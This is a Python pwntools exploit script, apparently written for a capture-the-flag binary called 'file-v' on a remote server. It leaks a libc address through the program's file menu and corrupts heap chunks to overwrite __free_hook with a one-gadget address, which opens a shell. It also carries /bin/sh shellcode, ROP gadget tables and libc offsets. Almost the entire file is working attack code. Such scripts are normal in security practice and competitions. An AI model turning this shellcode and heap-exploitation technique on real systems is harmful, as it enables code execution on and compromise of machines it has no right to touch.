#!/usr/bin/env python

import sys
import time
import string
import argparse
from pwn import *
from ctypes import *

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'
context.terminal = ['tmux','splitw','-h']

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #

SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './file-v'
binary = ELF(program_name)

remote_server = '3.36.184.9'
PORT = 5555

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
parser.add_argument('--ssh', '-s', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

elif args.ssh:
    ssh = pwn.ssh('username', 'machine', ssh_agent=True)
    output = ssh('/bin/ls /').decode()

else:
    # know libc
    if args.lib:
        if context.arch == 'amd64':
            libc_native = CDLL("./libc-2.27.so")
        libc = ELF("./libc-2.27.so")
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        if context.arch == 'amd64':
            libc_native = CDLL("./libc-2.27.so")
        libc = ELF("./libc-2.27.so")
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ================= OFFSETS & GADGETS & MAGIC ================== #
# ============================================================== #

# ============ PLT =========== #

free_PLT = 0xd70
recv_PLT = 0xd80
putchar_PLT = 0xd90
localtime_PLT = 0xda0
strncmp_PLT = 0xdb0
puts_PLT = 0xdc0
fread_PLT = 0xdd0
fclose_PLT = 0xde0
strlen_PLT = 0xdf0
__stack_chk_fail_PLT = 0xe00
asctime_PLT = 0xe10
send_PLT = 0xe20
memset_PLT = 0xe30
alarm_PLT = 0xe40
epoll_ctl_PLT = 0xe50
read_PLT = 0xe60
calloc_PLT = 0xe70
strtol_PLT = 0xe80
memcpy_PLT = 0xe90
socketpair_PLT = 0xea0
time_PLT = 0xeb0
__xstat_PLT = 0xec0
malloc_PLT = 0xed0
__printf_chk_PLT = 0xee0
setvbuf_PLT = 0xef0
fopen_PLT = 0xf00
perror_PLT = 0xf10
epoll_create_PLT = 0xf20
exit_PLT = 0xf30
fork_PLT = 0xf40
epoll_pwait_PLT = 0xf50
__ctype_b_loc_PLT = 0xf60
__cxa_finalize_PLT = 0xf70

# ============ GOT =========== #

_ITM_deregisterTMCloneTable_GOT = 0x204fd8
__libc_start_main_GOT = 0x204fe0
__gmon_start___GOT = 0x204fe8
_ITM_registerTMCloneTable_GOT = 0x204ff0
__cxa_finalize_GOT = 0x204ff8
stdout_GOT = 0x205080
stdin_GOT = 0x205090
stderr_GOT = 0x2050a0
free_GOT = 0x204ed8
recv_GOT = 0x204ee0
putchar_GOT = 0x204ee8
localtime_GOT = 0x204ef0
strncmp_GOT = 0x204ef8
puts_GOT = 0x204f00
fread_GOT = 0x204f08
fclose_GOT = 0x204f10
strlen_GOT = 0x204f18
__stack_chk_fail_GOT = 0x204f20
asctime_GOT = 0x204f28
send_GOT = 0x204f30
memset_GOT = 0x204f38
alarm_GOT = 0x204f40
epoll_ctl_GOT = 0x204f48
read_GOT = 0x204f50
calloc_GOT = 0x204f58
strtol_GOT = 0x204f60
memcpy_GOT = 0x204f68
socketpair_GOT = 0x204f70
time_GOT = 0x204f78
__xstat_GOT = 0x204f80
malloc_GOT = 0x204f88
__printf_chk_GOT = 0x204f90
setvbuf_GOT = 0x204f98
fopen_GOT = 0x204fa0
perror_GOT = 0x204fa8
epoll_create_GOT = 0x204fb0
exit_GOT = 0x204fb8
fork_GOT = 0x204fc0
epoll_pwait_GOT = 0x204fc8
__ctype_b_loc_GOT = 0x204fd0

# ============ BINARY GADGETS =========== #

pop_rdi = 0x0000000000001392 # pop rdi; ret; 
pop_rdi = 0x00000000000022ca # pop rdi; ret; 
pop_rdi = 0x0000000000003036 # pop rdi; ret; 
pop_rdi = 0x00000000000036f3 # pop rdi; ret; 
pop_rsi = 0x0000000000002517 # pop rsi; add rsp, 0x20; pop rbx; pop rbp; pop r12; ret; 
pop_rsi = 0x0000000000001390 # pop rsi; pop r15; ret; 
pop_rsi = 0x00000000000022c8 # pop rsi; pop r15; ret; 
pop_rsi = 0x0000000000003034 # pop rsi; pop r15; ret; 
pop_rsi = 0x00000000000036f1 # pop rsi; pop r15; ret; 
pop_rsi = 0x0000000000001846 # pop rsi; ret; 
pop_rsi = 0x00000000000028cd # pop rsi; ret; 
pop_rsi = 0x0000000000002b2c # pop rsi; ret; 
pop_rbx = 0x0000000000002a0c # pop rbx; mov eax, 0xc00000bb; pop rbp; pop r12; ret; 
pop_rbx = 0x0000000000002398 # pop rbx; mov eax, ebp; pop rbp; ret; 
pop_rbx = 0x0000000000002eaa # pop rbx; mov eax, ebp; pop rbp; ret; 
pop_rbx = 0x0000000000001409 # pop rbx; neg eax; pop rbp; pop r12; ret; 
pop_rbx = 0x000000000000183f # pop rbx; pop rbp; pop r12; pop r13; pop r14; ret; 
pop_rbx = 0x00000000000028c6 # pop rbx; pop rbp; pop r12; pop r13; pop r14; ret; 
pop_rbx = 0x00000000000014c1 # pop rbx; pop rbp; pop r12; pop r13; ret; 
pop_rbx = 0x00000000000016e1 # pop rbx; pop rbp; pop r12; pop r13; ret; 
pop_rbx = 0x0000000000001591 # pop rbx; pop rbp; pop r12; ret; 
pop_rbx = 0x0000000000001675 # pop rbx; pop rbp; pop r12; ret; 
pop_rbx = 0x0000000000002112 # pop rbx; pop rbp; pop r12; ret; 
pop_rbx = 0x000000000000251c # pop rbx; pop rbp; pop r12; ret; 
pop_rbx = 0x00000000000029f3 # pop rbx; pop rbp; pop r12; ret; 
pop_rbx = 0x0000000000002c1d # pop rbx; pop rbp; pop r12; ret; 
pop_rbx = 0x0000000000002d85 # pop rbx; pop rbp; pop r12; ret; 
pop_rbx = 0x0000000000001157 # pop rbx; pop rbp; ret; 
pop_rbx = 0x00000000000011cc # pop rbx; pop rbp; ret; 
pop_rbx = 0x0000000000001782 # pop rbx; pop rbp; ret; 
pop_rbx = 0x0000000000002776 # pop rbx; ret; 
pop_rbp = 0x000000000000138a # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x00000000000022c2 # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x000000000000302e # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x00000000000036eb # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000001840 # pop rbp; pop r12; pop r13; pop r14; ret; 
pop_rbp = 0x00000000000028c7 # pop rbp; pop r12; pop r13; pop r14; ret; 
pop_rbp = 0x0000000000002b26 # pop rbp; pop r12; pop r13; pop r14; ret; 
pop_rbp = 0x00000000000014c2 # pop rbp; pop r12; pop r13; ret; 
pop_rbp = 0x00000000000016e2 # pop rbp; pop r12; pop r13; ret; 
pop_rbp = 0x000000000000140c # pop rbp; pop r12; ret; 
pop_rbp = 0x0000000000001592 # pop rbp; pop r12; ret; 
pop_rbp = 0x0000000000001676 # pop rbp; pop r12; ret; 
pop_rbp = 0x0000000000002113 # pop rbp; pop r12; ret; 
pop_rbp = 0x000000000000251d # pop rbp; pop r12; ret; 
pop_rbp = 0x00000000000029f4 # pop rbp; pop r12; ret; 
pop_rbp = 0x0000000000002a12 # pop rbp; pop r12; ret; 
pop_rbp = 0x0000000000002c1e # pop rbp; pop r12; ret; 
pop_rbp = 0x0000000000002d86 # pop rbp; pop r12; ret; 
pop_rbp = 0x000000000000138e # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x00000000000022c6 # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000003032 # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x00000000000036ef # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000001844 # pop rbp; pop r14; ret; 
pop_rbp = 0x00000000000028cb # pop rbp; pop r14; ret; 
pop_rbp = 0x0000000000002b2a # pop rbp; pop r14; ret; 
pop_rbp = 0x0000000000001060 # pop rbp; ret; 
pop_rbp = 0x00000000000010b0 # pop rbp; ret; 
pop_rbp = 0x00000000000010ef # pop rbp; ret; 
pop_rbp = 0x0000000000001158 # pop rbp; ret; 
pop_rbp = 0x00000000000011cd # pop rbp; ret; 
pop_rbp = 0x00000000000014c6 # pop rbp; ret; 
pop_rbp = 0x00000000000016e6 # pop rbp; ret; 
pop_rbp = 0x0000000000001783 # pop rbp; ret; 
pop_rbp = 0x000000000000239b # pop rbp; ret; 
pop_rbp = 0x0000000000002ead # pop rbp; ret; 
pop_rsp = 0x000000000000138c # pop rsp; pop r13; pop r14; pop r15; ret; 
pop_rsp = 0x00000000000022c4 # pop rsp; pop r13; pop r14; pop r15; ret; 
pop_rsp = 0x0000000000003030 # pop rsp; pop r13; pop r14; pop r15; ret; 
pop_rsp = 0x00000000000036ed # pop rsp; pop r13; pop r14; pop r15; ret; 
pop_rsp = 0x0000000000001842 # pop rsp; pop r13; pop r14; ret; 
pop_rsp = 0x00000000000028c9 # pop rsp; pop r13; pop r14; ret; 
pop_rsp = 0x0000000000002b28 # pop rsp; pop r13; pop r14; ret; 
pop_rsp = 0x00000000000014c4 # pop rsp; pop r13; ret; 
pop_rsp = 0x00000000000016e4 # pop rsp; pop r13; ret; 
pop_rsp = 0x000000000000140e # pop rsp; ret; 
pop_rsp = 0x0000000000001594 # pop rsp; ret; 
pop_rsp = 0x0000000000001678 # pop rsp; ret; 
pop_rsp = 0x0000000000002115 # pop rsp; ret; 
pop_rsp = 0x000000000000251f # pop rsp; ret; 
pop_rsp = 0x00000000000029f6 # pop rsp; ret; 
pop_rsp = 0x0000000000002a14 # pop rsp; ret; 
pop_rsp = 0x0000000000002c20 # pop rsp; ret; 
pop_rsp = 0x0000000000002d88 # pop rsp; ret; 

# ============ LIBC OFFSETS =========== #

free_off = 0x97a30
recv_off = 0x122890
putchar_off = 0x828f0
localtime_off = 0xd1350
strncmp_off = 0x9de40
puts_off = 0x80aa0
fread_off = 0x7f460
fclose_off = 0x7e330
strlen_off = 0x9ddb0
__stack_chk_fail_off = 0x134b10
asctime_off = 0xd1120
send_off = 0x122ac0
memset_off = 0x9ec40
alarm_off = 0xe4610
epoll_ctl_off = 0x1220d0
read_off = 0x110140
calloc_off = 0x9a170
strtol_off = 0x45230
memcpy_off = 0xbb240
socketpair_off = 0x122d80
time_off = 0xd2750
__xstat_off = 0x10f830
malloc_off = 0x97140
__printf_chk_off = 0x132060
setvbuf_off = 0x813d0
fopen_off = 0x7ef10
perror_off = 0x7b350
epoll_create_off = 0x122070
exit_off = 0x43240
fork_off = 0xe4820
epoll_pwait_off = 0x121810
__ctype_b_loc_off = 0x30980
__cxa_finalize_off = 0x43640

# ============ MAGIC =========== #

mal_hook_off = 0x3ebc30
free_hook_off = 0x3ed8e8
system_off = 0x4f550
binsh_off = 0x1b3e1a

# ============ ONE GADGETS =========== #

one_gag = [ 0x4f3d5, 0x4f432, 0x10a41c, 0 ] 


# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

sl = p.sendline
sla = p.sendlineafter
sa = p.sendafter
s = p.send

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============ GDB =========== #
def debug():
    gdb.debug(args=[program_name],gdbscript='''
    set follow-fork-mode child
    set follow-exec-mode new
    b *0x2003+0x0000555555400000
    ''')

def debug2():
    gdb.attach(p,'''
    pie breakpoint *0x2AD3
    ''')

def show_drive():
    p.sendlineafter('> ','a')
    return p.recvuntil('-------------------------- MENU ---------------------------').replace('-------------------------- MENU ---------------------------','')

def create_file(len, filename):
    p.sendlineafter('> ','c')
    p.sendlineafter('of filename:', str(len)) # < 0x7FFF
    p.sendafter('filename:', filename)
    p.recvuntil('create a file')

def edit_filename(new_size, new_filename, filename='', conti=1):
    if conti == 0:
        p.sendlineafter('> ','b')
        p.sendlineafter('filename:', filename)
    p.sendlineafter('> ','1')
    p.sendlineafter('length of filename: ', str(new_size))
    p.sendafter('filename: ', new_filename)

def edit_content(new_size, new_content, filename='', conti=1):
    if conti == 0:
        p.sendlineafter('> ','b')
        p.sendlineafter('filename:', filename)
    p.sendlineafter('> ','4')
    p.sendlineafter('size of content: ', str(new_size))
    p.sendafter('Enter content:', new_content)

def remove_file(filename='', conti=1):
    if conti == 0:
        p.sendlineafter('> ','b')
        p.sendlineafter('filename:', filename)
    p.sendlineafter('> ','d')

def save_changes(filename='', conti=1):
    if conti == 0:
        p.sendlineafter('> ','b')
        p.sendlineafter('filename:', filename)
    p.sendlineafter('> ','5')
    p.sendlineafter('> ','b')

def show_content(filename='', conti=1):
    if conti == 0:
        p.sendlineafter('> ','b')
        p.sendlineafter('filename:', filename)
    p.sendlineafter('> ','3')
    return p.recvuntil('[1] Edit filename').replace('[1] Edit filename','')


# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    # debug()



    create_file(0x10, "lord1")
    create_file(0x10, "lord2")

    edit_content(0x18, "1"*0x18, filename="lord1", conti=0)
    save_changes()

    edit_content(0x18, "2"*0x18, filename="lord2", conti=0)
    save_changes()

    create_file(10, "AAAA")
    create_file(0x10, "B"*0x10)

    edit_filename(10, "flag", filename="AAAA", conti=0)
    edit_content(2000, "aaaaaaaa\x00CACA")
    save_changes()

    # edit_content(250, "XXXX", filename="flag", conti=0)
    # save_changes()

    # edit_filename(10, "flag", filename="BBBB", conti=0)
    # edit_content(1006, "bbbbbbbb")
    # save_changes()

    # remove_file("flag", conti=0)
    # remove_file("flag", conti=0)

    # edit_content(100, "bbbbbbbb\x00BBBBB", filename="flag", conti=0)
    # save_changes()

    # print(show_content(filename="flag", conti=0))
    # save_changes()

    # leak libc
    data = show_content(filename="flag", conti=0)
    print(data[:900])
    leak = data[:900].split('\n')[1:]
    collect_heap = []
    for i in range(3):
        collect_heap.append((leak[i].split('|'))[1].split(' '))

    libc_leak = '0x' + \
                collect_heap[1][10] + \
                collect_heap[1][9] + \
                collect_heap[1][8] + \
                collect_heap[1][7] + \
                collect_heap[1][6] + \
                collect_heap[1][5] + \
                collect_heap[1][4]

    libc_base = int(libc_leak, 16)-0x3ec2b0
    log.info("Libc Leak= "+hex(libc_base))

    save_changes()


    # ATTACK

    '''
    221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
    508: 00000000003f0800     8 OBJECT  GLOBAL DEFAULT   35 argp_program_version_hook@@GLIBC_2.2.5
    995: 00000000003f0588     8 OBJECT  GLOBAL DEFAULT   35 _dl_open_hook@@GLIBC_PRIVATE
    1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
    1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
    1857: 00000000003ed8f0     8 OBJECT  WEAK   DEFAULT   35 __malloc_initialize_hook@GLIBC_2.2.5
    1896: 00000000003ed8e0     8 OBJECT  WEAK   DEFAULT   35 __after_morecore_hook@@GLIBC_2.2.5
    2218: 00000000003f0580     8 OBJECT  GLOBAL DEFAULT   35 _dl_open_hook2@@GLIBC_PRIVATE
    2311: 00000000003ebc20     8 OBJECT  WEAK   DEFAULT   34 __memalign_hook@@GLIBC_2.2.5
    '''

    create_file(0x8, '\x21')

    payload1 = 'c'*0x60
    data = edit_content(0x60, payload1, filename='\x21', conti=0)


    target = libc_base+0x00000000003ed8e8-0x1a-8
    print("TARGET=",hex(target))
    payload2 = '\x00'*6 
    payload2 += p64(0)*3
    payload2 += p64(0x31)
    payload2 += p64(target)*2
    payload2 += p64(0)*3
    payload2 += p64(0x71)
    data = edit_content(0x58, payload2)

    p.sendlineafter('> ','b')
    p.sendline('N')

    # get rid of one
    # create_file(0x5, ''.ljust(0x5,'p'))
    # data = edit_content(0x1e, 'P'*0x1e, filename=''.ljust(0x5,'p'), conti=0)
    # data = edit_content(16, 'GGGGGG')
    # p.sendlineafter('> ','b')
    # p.sendline('N')

    # get rid of two
    # create_file(0x5, ''.ljust(0x5,'l'))
    # data = edit_content(0x1e, 'L'*0x1e, filename=''.ljust(0x5,'l'), conti=0)
    # data = edit_content(16, 'GGGGGG')
    # p.sendlineafter('> ','b')
    # p.sendline('N')

    '''
    0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
    rsp & 0xf == 0
    rcx == NULL

    0x4f432 execve("/bin/sh", rsp+0x40, environ)
    constraints:
    [rsp+0x40] == NULL

    0x10a41c execve("/bin/sh", rsp+0x70, environ)
    constraints:
    [rsp+0x70] == NULL
    '''

    win = libc_base + 0x10a41c
    system = libc_base + 0x000000000004f550
    execve = libc_base + 0xE4D70
    exceve2 = libc_base + 0xe4c00


    # data = edit_content(0x150, 'q'*0x150)

    create_file(1, "K")
    create_file(0x10, "lord22")

    debug2()

    edit_content(0x10-2, '/bin/sh\x00'+p64(win)[:6], filename="K", conti=0)
    # save_changes()

    # edit_content(0x18, "2"*0x18, filename="lord2", conti=0)
    # save_changes()

    
    p.interactive()
    
    

# ============================================================== #
# =========================== NOTES ============================ #
# ============================================================== #
'''
# ROOT = 0x2050B8+0x0000555555400000
'''
